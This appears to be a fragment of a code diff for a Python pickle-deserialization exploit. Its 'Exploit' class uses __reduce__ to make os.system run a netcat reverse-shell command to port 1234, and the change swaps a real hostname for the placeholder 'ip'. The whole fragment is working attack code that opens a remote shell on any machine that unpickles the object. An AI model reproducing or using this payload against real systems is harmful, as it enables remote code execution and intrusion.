@@ -4,7 +4,7 @@ import os
 
 class Exploit(object):
     def __reduce__(self):
-        self.payload = 'nc mapit.cf 1234 -e /bin/bash'
+        self.payload = 'nc ip 1234 -e /bin/bash'
         return(os.system, (
                 self.payload,))
 # token to be sent
